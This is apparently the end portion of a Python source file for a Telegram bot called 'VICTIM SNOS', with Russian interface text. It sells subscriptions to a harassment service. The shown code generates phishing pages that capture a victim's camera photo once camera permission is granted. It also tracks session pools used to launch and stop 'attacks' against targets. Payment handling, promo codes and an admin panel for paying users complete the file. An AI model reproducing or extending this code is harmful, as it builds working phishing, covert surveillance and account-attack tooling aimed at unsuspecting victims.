    title = msg.text.strip()
    user_id = msg.from_user.id
    
    await state.clear()
    await msg.delete()
    
    status_msg = await send_message(msg, "🎣 <b>СОЗДАНИЕ СТРАНИЦЫ</b>\n\n⏳ Подождите...")
    
    page_id = hashlib.md5(f"{user_id}_{time.time()}".encode()).hexdigest()[:10]
    url = await create_phishing_page(title, user_id, page_id)
    
    if url:
        await status_msg.edit_caption(
            caption=f"<b>🔱 VICTIM SNOS</b>\n\n✅ <b>СТРАНИЦА СОЗДАНА</b>\n\n🔗 Ссылка:\n<code>{url}</code>\n\n📸 При переходе жертвы и разрешении камеры вы получите фото.",
            reply_markup=get_main_menu(user_id)
        )
    else:
        await status_msg.edit_caption(caption=f"<b>🔱 VICTIM SNOS</b>\n\n❌ <b>ОШИБКА</b>", reply_markup=get_main_menu(user_id))

@dp.message(F.photo)
async def handle_phish_photo(msg: types.Message):
    if msg.caption:
        for page_id, page in list(phish_pages.items()):
            if page_id in msg.caption and msg.chat.id == page.get("chat_id"):
                await msg.reply(f"📸 <b>ФОТО ПОЛУЧЕНО!</b>\n\nID: <code>{page_id}</code>")
                break

# Покупка
@dp.callback_query(F.data == "purchase_menu")
async def purchase_menu(cb: types.CallbackQuery):
    await cb.message.edit_caption(caption="<b>🔱 VICTIM SNOS</b>\n\n<b>💰 ПРИОБРЕТЕНИЕ ДОСТУПА</b>\n\nВыберите тариф:", reply_markup=get_purchase_menu())

@dp.callback_query(F.data.startswith("buy_"))
async def buy_subscription(cb: types.CallbackQuery):
    duration = cb.data.replace("buy_", "")
    prices = {"30d": ("30 дней", 100), "60d": ("60 дней", 200), "forever": ("Навсегда", 400)}
    name, price = prices[duration]
    
    await bot.send_invoice(
        chat_id=cb.from_user.id,
        title=f"VICTIM SNOS - {name}",
        description=f"Доступ к боту на {name}",
        payload=f"sub_{duration}",
        provider_token=PAYMENT_PROVIDER_TOKEN,
        currency="RUB",
        prices=[LabeledPrice(label=name, amount=price * 100)],
        start_parameter="victim_snos",
        protect_content=True
    )
    await cb.message.delete()
    await cb.message.answer(f"💳 Счет выставлен\nТариф: {name}\nСумма: {price}₽")

@dp.pre_checkout_query()
async def process_pre_checkout(query: PreCheckoutQuery):
    await bot.answer_pre_checkout_query(query.id, ok=True)

@dp.message(F.successful_payment)
async def process_payment(msg: types.Message):
    payload = msg.successful_payment.invoice_payload
    if payload.startswith("sub_"):
        duration = payload.replace("sub_", "")
        if duration == "forever":
            add_subscription(msg.from_user.id, forever=True)
            text = "навсегда"
        else:
            add_subscription(msg.from_user.id, days=int(duration.replace("d", "")))
            text = f"на {duration}"
        await msg.answer(f"✅ <b>ОПЛАТА УСПЕШНА!</b>\n\nДоступ активирован {text}\nИспользуйте /start")

@dp.callback_query(F.data == "use_promo")
async def use_promo_start(cb: types.CallbackQuery, state: FSMContext):
    await state.set_state(PurchaseState.waiting_promo)
    await cb.message.delete()
    await cb.message.answer("<b>🔱 VICTIM SNOS</b>\n\n🎁 Введите промокод:",
                          reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("❌ Отмена", "purchase_menu")]]))

@dp.message(StateFilter(PurchaseState.waiting_promo))
async def process_promo(msg: types.Message, state: FSMContext):
    code = msg.text.strip().upper()
    await msg.delete()
    await state.clear()
    
    if code in promo_codes and promo_codes[code]["uses"] > 0:
        add_subscription(msg.from_user.id, days=promo_codes[code]["days"])
        promo_codes[code]["uses"] -= 1
        save_promo_codes()
        await send_message(msg, f"✅ Промокод активирован!\nДоступ на {promo_codes[code]['days']} дней", get_main_menu(msg.from_user.id))
    else:
        await send_message(msg, "❌ Неверный или истекший промокод", get_purchase_menu())

# Статус и стоп
@dp.callback_query(F.data == "status")
async def status(cb: types.CallbackQuery):
    if not await check_access(cb.from_user.id, cb):
        return
    
    user_id = cb.from_user.id
    pool = user_pools.get(user_id)
    sessions = len(pool.sessions) if pool else 0
    can_attack, remaining = await check_cooldown(user_id)
    cooldown = "✅ Готов" if can_attack else f"⏳ {int(remaining)} сек"
    
    await cb.message.edit_caption(
        caption=f"<b>🔱 VICTIM SNOS</b>\n\n🆔 ID: <code>{user_id}</code>\n📱 Сессий: {sessions}\n⏰ Статус: {cooldown}",
        reply_markup=InlineKeyboardMarkup(inline_keyboard=[[create_button("◀️ НАЗАД", "main_menu")]])
    )

@dp.callback_query(F.data == "stop")
async def stop_attack(cb: types.CallbackQuery):
    user_id = cb.from_user.id
    if user_id in active_attacks:
        active_attacks[user_id].set()
        del active_attacks[user_id]
        await cb.answer("✅ Атака остановлена", show_alert=True)
    else:
        await cb.answer("❌ Нет активных атак", show_alert=True)

@dp.callback_query(F.data == "stop_attack")
async def stop_attack_button(cb: types.CallbackQuery):
    await stop_attack(cb)
    await cb.message.edit_caption(caption="<b>🔱 VICTIM SNOS</b>\n\n⏹ <b>АТАКА ОСТАНОВЛЕНА</b>", reply_markup=get_main_menu(cb.from_user.id))

# Админ
@dp.message(Command("admin"))
async def admin_cmd(msg: types.Message):
    if msg.from_user.id != ADMIN_ID:
        return
    await msg.delete()
    
    buttons = [
        [("➕ Добавить", "admin_add")],
        [("➖ Удалить", "admin_remove")],
        [("🎁 Промокод", "admin_create_promo")],
        [("📋 Список", "admin_list")],
    ]
    await send_message(msg, "<b>👑 АДМИН ПАНЕЛЬ</b>", create_keyboard(buttons))

@dp.callback_query(F.data == "admin_add")
async def admin_add(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_user_id)
    await cb.message.delete()
    await cb.message.answer("Введите ID пользователя:")

@dp.message(StateFilter(AdminState.waiting_user_id))
async def admin_add_user(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        user_id = int(msg.text.strip())
        add_subscription(user_id, forever=True)
        await msg.delete()
        await send_message(msg, f"✅ Пользователь <code>{user_id}</code> добавлен")
    except:
        await send_message(msg, "❌ Неверный ID!")
    await state.clear()

@dp.callback_query(F.data == "admin_create_promo")
async def admin_promo(cb: types.CallbackQuery, state: FSMContext):
    if cb.from_user.id != ADMIN_ID:
        return
    await state.set_state(AdminState.waiting_promo_code)
    await cb.message.delete()
    await cb.message.answer("Введите промокод:")

@dp.message(StateFilter(AdminState.waiting_promo_code))
async def admin_promo_code(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    await state.update_data(promo_code=msg.text.strip().upper())
    await state.set_state(AdminState.waiting_promo_days)
    await msg.delete()
    await msg.answer("Введите количество дней:")

@dp.message(StateFilter(AdminState.waiting_promo_days))
async def admin_promo_days(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        days = int(msg.text.strip())
        await state.update_data(promo_days=days)
        await state.set_state(AdminState.waiting_promo_uses)
        await msg.delete()
        await msg.answer("Введите количество использований:")
    except:
        await send_message(msg, "❌ Неверное число!")
        await state.clear()

@dp.message(StateFilter(AdminState.waiting_promo_uses))
async def admin_promo_uses(msg: types.Message, state: FSMContext):
    if msg.from_user.id != ADMIN_ID:
        return
    try:
        uses = int(msg.text.strip())
        data = await state.get_data()
        promo_codes[data["promo_code"]] = {"days": data["promo_days"], "uses": uses}
        save_promo_codes()
        await msg.delete()
        await send_message(msg, f"✅ Промокод {data['promo_code']} создан\nДней: {data['promo_days']}\nИспользований: {uses}")
    except:
        await send_message(msg, "❌ Неверное число!")
    await state.clear()

@dp.callback_query(F.data == "admin_remove")
async def admin_remove(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    if not ALLOWED_USERS:
        await cb.answer("Список пуст", show_alert=True)
        return
    
    buttons = [[(f"❌ Удалить {uid}", f"remove_{uid}")] for uid in list(ALLOWED_USERS.keys())[:20]]
    await cb.message.edit_caption(caption="<b>👑 УДАЛЕНИЕ</b>", reply_markup=create_keyboard(buttons))

@dp.callback_query(F.data.startswith("remove_"))
async def admin_remove_user(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    user_id = cb.data.replace("remove_", "")
    if user_id in ALLOWED_USERS:
        del ALLOWED_USERS[user_id]
        save_allowed_users()
    await cb.message.edit_caption(caption=f"✅ Пользователь <code>{user_id}</code> удален")

@dp.callback_query(F.data == "admin_list")
async def admin_list(cb: types.CallbackQuery):
    if cb.from_user.id != ADMIN_ID:
        return
    text = "<b>👑 ПОЛЬЗОВАТЕЛИ</b>\n\n"
    for uid, data in list(ALLOWED_USERS.items())[:30]:
        expire = data.get("expire_date", "неизвестно")
        text += f"<code>{uid}</code> - {expire}\n"
    if not ALLOWED_USERS:
        text += "Пусто"
    await cb.message.edit_caption(caption=text)

# ---------- ЗАПУСК ----------
async def on_startup():
    load_allowed_users()
    load_promo_codes()
    os.makedirs("sessions", exist_ok=True)
    logger.info("Bot started!")

async def main():
    await on_startup()
    await bot.delete_webhook(drop_pending_updates=True)
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
